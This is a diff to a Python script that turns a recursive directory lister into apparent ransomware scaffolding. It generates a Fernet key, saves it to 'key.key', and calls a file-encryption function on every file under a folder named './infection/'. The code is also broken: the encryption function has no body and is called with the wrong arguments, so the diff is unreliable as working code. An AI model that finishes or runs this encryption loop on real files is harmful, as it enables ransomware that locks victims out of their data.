@@ -1,16 +1,33 @@
 import argparse
 import os
+import sys
 
+from cryptography.fernet import Fernet
+
+
+
+def encrypt_file(file_name, key):
+
+
+
+def generate_key():
+    key = Fernet.generate_key()
+    with open("key.key", "wb") as key_file:
+        key_file.write(key)
 
 def list_dir(base_dir):
     print('Listing:', base_dir)
-    with os.scandir(base_dir) as entries:
-        for entry in entries:
-            if entry.is_dir():
-                print('Directory:', entry.name)
-                list_dir(entry.path)
-            else:
-                print('File:', entry.name)
+    try:
+        with os.scandir(base_dir) as entries:
+            for entry in entries:
+                if entry.is_dir():
+                    print('Directory:', entry.name)
+                    list_dir(entry.path)
+                else:
+                    encrypt_file(entry.name)
+    except FileNotFoundError:
+        print(f"Directory not found: '{base_dir}'")
+        sys.exit(1)
 
 
 if __name__ == '__main__':
@@ -36,4 +53,5 @@ if __name__ == '__main__':
     )
     args = parser.parse_args()
     base_dir = './infection/'
+    generate_key()
     list_dir(base_dir)
